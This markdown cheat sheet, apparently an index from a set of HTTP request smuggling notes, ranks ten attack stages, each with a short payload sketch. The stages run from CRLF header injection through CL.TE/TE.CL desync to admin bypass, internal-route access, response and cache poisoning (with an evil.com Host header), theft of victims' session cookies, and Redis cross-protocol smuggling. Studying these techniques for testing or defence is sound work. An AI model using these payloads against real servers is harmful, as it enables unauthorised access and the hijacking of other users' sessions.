# Desync ladder — the escalation order

## Rung 1 — the fold (CRLF-injection)

```text
?host=x%0d%0aX-Inj:%201
```

The lowest bar — a control character folds a header — proves the
interpolated value isn't encoded — `crlf-injection.md`.

## Rung 2 — the desync (CL.TE / TE.CL / TE.TE / CL.CL / CL.0)

```text
POST / CL:4 TE:chunked body=5c\r\nGET /404 ...\r\nx=1\r\n0\r\n\r\n
```

The body-boundary disagreement — the smuggle runs as a second request —
`desync-taxonomy.md`.

## Rung 3 — the front-bypass — the filtered route

```text
[smuggle: GET /admin]
```

The smuggle reaches a route the front filters — `frontend-bypass.md`.

## Rung 4 — the internal-route — the loopback-only

```text
[smuggle: GET /flag Host: internal]
```

The smuggle reaches a loopback-only route — `internal-routes.md`.

## Rung 5 — the queue-poison — the next-victim's response

```text
[smuggle: GET /poison] → victim's GET / → victim gets /poison
```

The response-queue poisons — `response-poisoning.md`.

## Rung 6 — the session-hijack — the victim's cookie

```text
[smuggle: POST /store CL:400 body=x=]
```

The victim's `Cookie:` inside `x=` — `session-hijack.md`.

## Rung 7 — the cache-poison — the cached response

```text
[smuggle: GET /?cb=xyz Host: evil.com]
```

The smuggle's response caches — `cache-poison-via-smuggle.md`.

## Rung 8 — the client-side-desync — the victim's request

```text
POST /ignored CL:60 body=GET /admin
```

The smuggle runs as the NEXT VICTIM's request — `client-side-desync.md`.

## Rung 9 — the cross-protocol — HTTP inside Redis/memcached

```text
[smuggle: SET k v\r\nGET k\r\n]
```

The smuggle's bytes are Redis commands — `advanced-reach.md`.

## Rung 10 — the upgrade-tunnel — inside a ws/h2c frame

```text
Upgrade: websocket → HTTP inside a frame
```

`upgrade-smuggling.md`.

## The ladder's use — the escalation order

Start at rung 1 (the fold) — each rung is a more-committed exploit —
the ladder orders the work — `workflow.md`.
